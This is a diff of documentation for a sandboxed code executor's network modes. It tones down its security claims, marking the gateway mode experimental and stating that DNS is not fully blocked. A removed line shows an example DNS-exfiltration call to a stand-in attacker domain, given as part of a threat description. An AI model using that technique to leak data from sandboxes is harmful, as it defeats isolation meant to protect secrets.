@@ -24,8 +24,10 @@ The executor's network behavior is controlled by :class:`NetworkMode`:
   - ``ENFORCED_GATEWAY``: the container runs on a Docker ``--internal``
     network with no direct internet access. All egress goes through a
     gateway container that enforces the allow-list at the network level.
-    This IS a security boundary (when correctly configured). Requires
-    Docker and a pre-created internal network + gateway container.
+    EXPERIMENTAL — this mode has not been validated with bypass tests in
+    all environments. Fail-closes to ``--network none`` if the gateway
+    network cannot be created. Requires Docker and a pre-created internal
+    network + gateway container.
 
 When a NetworkAllowList is provided AND network_mode is BEST_EFFORT_PROXY
 or ENFORCED_GATEWAY, the executor uses domain-level egress filtering.
@@ -44,15 +46,15 @@ uid 1000 (not root-with-no-caps) is strict defense-in-depth: even a
 kernel cap-bypass or a misconfigured cap grant leaves the process
 non-root.
 
-v3.1 DNS exfiltration fix: When an allow-list is present, the executor
-resolves allow-listed domains on the HOST at startup and injects them
-into the container via Docker's ``--add-host`` flag (e.g.,
-``--add-host pypi.org:151.101.0.223``). This eliminates the need for
-DNS (port 53) access inside the container, closing the loophole where
-malicious code could exfiltrate data via
-``socket.gethostbyname("secret.attacker.com")``. The container's
-``/etc/hosts`` contains only the injected entries — no DNS resolver is
-available.
+When an allow-list is present, the executor resolves allow-listed
+domains on the HOST at startup and injects them into the container via
+Docker's ``--add-host`` flag (e.g.,
+``--add-host pypi.org:151.101.0.223``). This reduces the need for DNS
+(port 53) access inside the container for allow-listed domains. NOTE:
+this does NOT fully disable DNS — the container may still have a DNS
+resolver configured by Docker's default network settings. The
+``--add-host`` entries supplement ``/etc/hosts`` but do not guarantee
+that all DNS queries are blocked.
 
 DNS can be restricted to a specific resolver via the `dns_resolver`
 parameter, which is passed to the SNI proxy for DNS resolution pinning
